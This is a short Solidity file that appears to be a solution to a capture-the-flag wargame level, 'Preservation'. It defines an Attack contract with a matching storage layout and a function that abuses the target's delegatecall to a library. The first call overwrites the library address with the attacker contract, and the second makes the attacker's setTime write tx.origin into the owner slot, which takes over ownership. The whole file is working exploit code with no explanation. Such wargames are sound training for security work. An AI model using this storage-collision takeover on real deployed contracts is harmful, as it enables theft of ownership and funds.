// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level16.sol";

contract Attack {
    address public firstSlot;
    address public secondSlot;
    address public owner;

    constructor() {
        firstSlot = address(1);
        secondSlot = address(2);
        owner = msg.sender;
    }

    function setTime(uint _time) public {
        owner = tx.origin;
    }

    function atatatak(Preservation _instance) public {
        _instance.setFirstTime(uint256(uint160(address(this))));
        _instance.setFirstTime(0);
    }
}
